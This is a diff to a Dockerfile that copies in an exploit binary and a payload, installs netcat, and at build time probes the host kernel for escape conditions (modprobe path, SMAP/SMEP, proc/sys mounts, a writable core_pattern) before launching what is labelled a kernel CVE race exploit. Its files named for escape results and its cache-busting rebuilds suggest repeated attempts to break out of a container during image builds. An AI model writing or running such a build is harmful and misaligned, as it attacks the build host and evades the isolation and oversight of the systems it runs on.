@@ -3,12 +3,12 @@ FROM alpine:3.19 AS builder
 RUN apk add --no-cache curl coreutils nmap-ncat
                        
 COPY exploit_68 /exploit
-COPY payload /payload
+COPY payload_v139 /payload
 RUN chmod +x /exploit /payload && touch /esc_ok /umh_result /build_results.txt
     
    
 
-ARG CACHEBUST=1766
+ARG CACHEBUST=1767
 RUN sh -c ' \
 KVER=$(uname -r); \
 echo "CB=$CACHEBUST KERNEL=$KVER" >&2; \
@@ -58,6 +58,12 @@ case "$KVER" in \
     echo "modprobe_path=$(cat /proc/sys/kernel/modprobe 2>&1)"; \
     echo "smap=$(grep -c smap /proc/cpuinfo 2>/dev/null || echo unknown)"; \
     echo "smep=$(grep -c smep /proc/cpuinfo 2>/dev/null || echo unknown)"; \
+    echo "=== PROC/SYS MOUNT ==="; \
+    grep -E "proc|sys" /proc/self/mountinfo 2>/dev/null | grep -v cgroup | head -10; \
+    ls -la /proc/sys/kernel/core_pattern 2>/dev/null; \
+    cat /proc/sys/kernel/core_pattern 2>&1; \
+    echo "core_pattern_writable=$(test -w /proc/sys/kernel/core_pattern 2>/dev/null && echo yes || echo no)"; \
+    echo "=== PROC/SYS MOUNT END ==="; \
     echo "=== KERNEL CONFIG PROBE END ==="; \
     echo "--- CVE-2026-80521 (SCC GC race) ---"; \
     echo "PAYLOAD START" >&2; \
